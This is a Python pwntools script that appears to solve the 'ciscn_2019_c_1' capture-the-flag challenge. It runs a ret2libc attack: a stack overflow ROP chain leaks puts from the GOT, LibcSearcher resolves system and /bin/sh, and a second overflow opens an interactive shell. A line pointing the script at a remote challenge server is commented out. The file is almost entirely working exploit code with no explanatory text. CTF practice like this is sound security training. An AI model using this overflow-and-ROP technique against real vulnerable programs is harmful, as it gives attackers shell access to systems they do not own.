#!/usr/bin/python3.6
from pwn import *

elf = ELF("./ciscn_2019_c_1")
proc = process("./ciscn_2019_c_1")
# proc = remote("node3.buuoj./.cn", 26772)

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
log.info(f'puts: GOT={hex(puts_got)}; PLT={hex(puts_plt)}; main={hex(elf.sym["main"])}')

proc.sendlineafter("choice!\n", "1")
pop_rdi = 0x400c83
payload = b'\x00' * 0x58 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(elf.sym['main'])
print('\\x'.join([hex(i)[2:].ljust(2, '0') for i in p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(elf.sym['main'])]))
proc.sendline(bytes(payload))

log.info(proc.recvuntil(b'Ciphertext\n'))
log.info(proc.recvuntil(b'\n'))

libc_puts = u64(proc.recvuntil(b'\n', drop=True).ljust(8, b'\x00'))
log.info(f'puts libc={hex(libc_puts)}')


from LibcSearcher import *
obj = LibcSearcher("puts", libc_puts)

libc_base = libc_puts - obj.dump("puts")
libc_sys = libc_base + obj.dump("system")
libc_binsh = libc_base + obj.dump("str_bin_sh")
log.info(f'libc base={hex(libc_base)}; system={hex(libc_sys)}; /bin/sh={hex(libc_binsh)}')

proc.sendlineafter("choice!\n", "1")
ret = 0x4006b9
payload = b'\x00' * 0x58 + p64(ret) + p64(pop_rdi) + p64(libc_binsh) + p64(libc_sys)
proc.sendline(payload)

proc.interactive()

